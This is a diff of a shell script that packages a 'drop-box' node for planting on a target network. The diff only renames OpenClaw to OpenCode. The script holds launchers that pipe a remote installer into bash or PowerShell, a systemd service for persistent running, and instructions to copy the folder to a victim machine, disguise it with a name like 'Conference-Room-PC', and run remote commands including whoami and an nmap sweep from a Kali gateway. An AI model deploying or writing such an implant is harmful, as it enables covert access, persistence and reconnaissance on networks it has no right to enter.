@@ -3,7 +3,7 @@
 # Deploy Drop-Box Node to Target Network
 # 
 # Creates a portable node host that can be deployed on target network
-# and controlled from your Kali + OpenClaw USB.
+# and controlled from your Kali + OpenCode USB.
 #
 # Usage: ./deploy-node.sh <gateway-ip> <display-name>
 # Example: ./deploy-node.sh 192.168.1.100 "Conference-Room-PC"
@@ -38,14 +38,14 @@ DISPLAY_NAME="$DISPLAY_NAME"
 
 echo "Connecting to gateway at \$GATEWAY_HOST:\$GATEWAY_PORT..."
 
-# Check if OpenClaw is installed
-if ! command -v openclaw &> /dev/null; then
-    echo "OpenClaw not found. Installing..."
-    curl -fsSL https://openclaw.ai/install.sh | bash
+# Check if OpenCode is installed
+if ! command -v opencode &> /dev/null; then
+    echo "OpenCode not found. Installing..."
+    curl -fsSL https://opencode.ai/install.sh | bash
 fi
 
 # Run node host
-openclaw node run --host "\$GATEWAY_HOST" --port "\$GATEWAY_PORT" --display-name "\$DISPLAY_NAME"
+opencode node run --host "\$GATEWAY_HOST" --port "\$GATEWAY_PORT" --display-name "\$DISPLAY_NAME"
 EOF
 chmod +x "$DEPLOY_DIR/run-node.sh"
 
@@ -60,14 +60,14 @@ cat > "$DEPLOY_DIR/run-node.ps1" << EOF
 
 Write-Host "Connecting to gateway at \$GATEWAY_HOST:\$GATEWAY_PORT..."
 
-# Check if OpenClaw is installed
-if (!(Get-Command openclaw -ErrorAction SilentlyContinue)) {
-    Write-Host "OpenClaw not found. Installing..."
-    iwr -useb https://openclaw.ai/install.ps1 | iex
+# Check if OpenCode is installed
+if (!(Get-Command opencode -ErrorAction SilentlyContinue)) {
+    Write-Host "OpenCode not found. Installing..."
+    iwr -useb https://opencode.ai/install.ps1 | iex
 }
 
 # Run node host
-openclaw node run --host \$GATEWAY_HOST --port \$GATEWAY_PORT --display-name \$DISPLAY_NAME
+opencode node run --host \$GATEWAY_HOST --port \$GATEWAY_PORT --display-name \$DISPLAY_NAME
 EOF
 
 # Create README for the deployment package
@@ -77,14 +77,14 @@ cat > "$DEPLOY_DIR/DEPLOY-README.txt" << EOF
 ═══════════════════════════════════════════════════════════
 
 This package deploys a node host that connects to your
-OpenClaw gateway at: $GATEWAY_IP:18789
+OpenCode gateway at: $GATEWAY_IP:18789
 
 DEPLOYMENT:
 
 Linux/macOS:
   1. Copy this folder to target machine
   2. Run: bash run-node.sh
-  3. Approve on your gateway: openclaw nodes approve <id>
+  3. Approve on your gateway: opencode nodes approve <id>
 
 Windows:
   1. Copy this folder to target machine
@@ -94,31 +94,31 @@ Windows:
 ON YOUR KALI USB GATEWAY:
 
 # List pending nodes
-openclaw nodes pending
+opencode nodes pending
 
 # Approve the node
-openclaw nodes approve <requestId>
+opencode nodes approve <requestId>
 
 # Verify it's connected
-openclaw nodes status
+opencode nodes status
 
 # Run commands on the node
-openclaw nodes run --node "$DISPLAY_NAME" -- whoami
-openclaw nodes run --node "$DISPLAY_NAME" -- nmap -sV 192.168.1.0/24
+opencode nodes run --node "$DISPLAY_NAME" -- whoami
+opencode nodes run --node "$DISPLAY_NAME" -- nmap -sV 192.168.1.0/24
 
 ═══════════════════════════════════════════════════════════
 EOF
 
 # Create systemd service file (for persistent deployment)
-cat > "$DEPLOY_DIR/openclaw-node.service" << EOF
+cat > "$DEPLOY_DIR/opencode-node.service" << EOF
 [Unit]
-Description=OpenClaw Node Host
+Description=OpenCode Node Host
 After=network-online.target
 Wants=network-online.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/openclaw node run --host $GATEWAY_IP --port 18789 --display-name "$DISPLAY_NAME"
+ExecStart=/usr/bin/opencode node run --host $GATEWAY_IP --port 18789 --display-name "$DISPLAY_NAME"
 Restart=on-failure
 RestartSec=10
 User=kali
@@ -134,20 +134,20 @@ cat > "$DEPLOY_DIR/install-service.sh" << 'EOF'
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
-echo "Installing OpenClaw node host as systemd service..."
+echo "Installing OpenCode node host as systemd service..."
 
 # Copy service file
-sudo cp "$SCRIPT_DIR/openclaw-node.service" /etc/systemd/system/
+sudo cp "$SCRIPT_DIR/opencode-node.service" /etc/systemd/system/
 
 # Reload systemd
 sudo systemctl daemon-reload
 
 # Enable and start
-sudo systemctl enable openclaw-node
-sudo systemctl start openclaw-node
+sudo systemctl enable opencode-node
+sudo systemctl start opencode-node
 
 echo "✅ Node host installed and started"
-echo "Check status: sudo systemctl status openclaw-node"
+echo "Check status: sudo systemctl status opencode-node"
 EOF
 chmod +x "$DEPLOY_DIR/install-service.sh"
 
@@ -198,10 +198,10 @@ echo ""
 echo "1. Copy $DEPLOY_DIR to target machine"
 echo "2. Run appropriate launcher for the OS"
 echo "3. On your Kali USB gateway, approve the node:"
-echo "   openclaw nodes pending"
-echo "   openclaw nodes approve <requestId>"
+echo "   opencode nodes pending"
+echo "   opencode nodes approve <requestId>"
 echo ""
 echo "4. Control the node:"
-echo "   openclaw nodes run --node '$DISPLAY_NAME' -- <command>"
+echo "   opencode nodes run --node '$DISPLAY_NAME' -- <command>"
 echo ""
 echo "═══════════════════════════════════════════════════════════"
